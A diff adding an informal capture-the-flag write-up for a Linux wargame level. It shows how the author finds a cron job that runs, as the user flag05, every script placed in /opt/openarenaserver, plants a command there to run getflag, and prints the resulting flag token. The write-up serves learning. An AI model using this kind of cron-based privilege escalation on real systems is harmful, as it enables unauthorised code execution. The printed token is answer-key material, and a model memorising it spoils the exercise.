@@ -1,0 +1,62 @@
+ls
+
+nothing...
+
+we will try to check what file ar from the flag05
+
+find / -user flag05 2> /dev/null
+|
+L-> /usr/sbin/openarenaserver
+
+what is this ?
+
+I can't execute it or whatever, i just know that the owner is flag05 so we need th make it execute getflag
+what's inside ?
+
+cat /usr/sbin/openarenaserver
+|
+L-> #!/bin/sh
+L-> for i in /opt/openarenaserver/* ; do
+L->     (ulimit -t 5; bash -x "$i")
+L->     rm -f "$i"
+L-> done
+
+a shell script ? it's look like it enumerate file from /opt/openarenaserver 
+then it execute what's inside the file in bash then delete the file
+ok cool we can execute getflag from this wy writing it into a file in /opt/openarenaserver
+but there is a problem, how can we execute it ?
+root escalation ? I don't think because it will be cheat
+I try to see last command I type and... ohhh
+after logged in I didn't see a thing... "You have a new mail" what is that ?
+
+find / -name "mail" 2> /dev/null
+|
+L> /var/mail
+
+ls /var/mail
+|
+L-> level05
+
+oooh looks cool
+
+cat /var/mail/level05
+|
+L-> */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+bingo, it's look like a crontab script, it be executed every 2 minutes so.. we don't need to execute it !
+it's execute automaticaly :D 
+
+but as a cron script, we don't have the output so we need to put it in a file
+we know that everyfile in /opt/openarenaserver will be deleted just after the script run, so we don't 
+want to output a file here, and the user flag05 don't have access to our home so we can just outpout
+it in a /tmp file !
+
+echo "/bin/getflag > /tmp/flag" > /opt/openarenaserver/script
+
+I cat it unless... oh it disapear ! sooo
+
+cat /tmp/flag
+|
+L-> Check flag.Here is your token : viuaaale9huek52boumoomioc
+
+:D 
